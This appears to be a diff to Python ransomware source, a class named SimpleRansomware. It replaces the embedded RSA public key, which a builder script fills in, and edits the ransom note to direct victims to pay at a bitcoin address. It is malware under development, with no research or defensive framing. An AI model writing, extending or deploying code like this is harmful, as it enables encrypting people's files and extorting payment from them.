@@ -12,13 +12,13 @@ import uuid
 
 # Public key will be inserted by payload_builder
 PUBLIC_KEY = '''-----BEGIN PUBLIC KEY-----
-MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArUwpk173eSKNhvgH6qeB
-A+yz96tOyUY5+m3Y354Mr6olQkF9ftMCVoqr8anrlUaSrT6E9a6gDfYLEQ4yo2us
-385UBkizzbK0VXIfwV1eZa1HPUGtolZmfP2Do3oidSYy2Pg2BaqxXxgEfP0CDeAS
-bKGLzxVYGJcihWVnvJ/SH5DWF77oWchKWMvZScgVCriggqVvZqeGuZPMrGq3ipAD
-/Ntk0jEh/iP4hkx2ClX6DWQp8ZgBaPIK1FgBccTsZT8uaLXcgzQNvDkE5GqVVgjL
-fcSJNJxIYp9+KFAruec9qSPCKD4RYgOoZvF5BKbFQP7D2TdyJWstxdW1IeTpB/z5
-SQIDAQAB
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAu8YcLFcz2GeRub+MSJa3
+TBTdDer75zRQ0JHzKIC+BPAFn4bOpTNg7VH5DdFCCSgo80/YjkyPb7N/vY69FQOn
+777673GX4y0HAS+QeeUziaZ5E6rnFKqOtD8/mBQA6IbnEjx0Sw4+swafqbQtt0hH
+uh9j48+M68jsrWujYCPdPQRerbImeGZymhiiYl3Sc8EE7sn/9CaTOyx8lcxxuK2f
+gSmd1Cf3C6mU0/k0UtGYD372+2OPySIDdJzfRb5Ijp9CMdt1+PtfiXTO8q4/6pdE
+g0EzEn5AZWUNe7sM6gTft0xpZNhIIGGqXgx4QxYd6Xf7DvVTObL++KfWQan8o3wZ
+VwIDAQAB
 -----END PUBLIC KEY-----'''
 
 class SimpleRansomware:
@@ -101,14 +101,15 @@ class SimpleRansomware:
         note = f"""
         ⚠️ YOUR FILES HAVE BEEN ENCRYPTED ⚠️
         
-        To recover your files, contact the attacker.
+        To recover your files, contact the attacker via this bitcoin address:
+        1FfmbHfnpaZjKFvyi1okTjJJusLhyoNnY
         
         Your Victim ID: {self.victim_id}
         
         Don't try to decrypt files yourself!
         """
         
-        with open("READ_ME.txt", "w", encoding='utf-8') as f:
+        with open("READ_ME.txt", "w", encoding="utf-8") as f:
             f.write(note)
         
         print("[+] Ransom note created: READ_ME.txt")
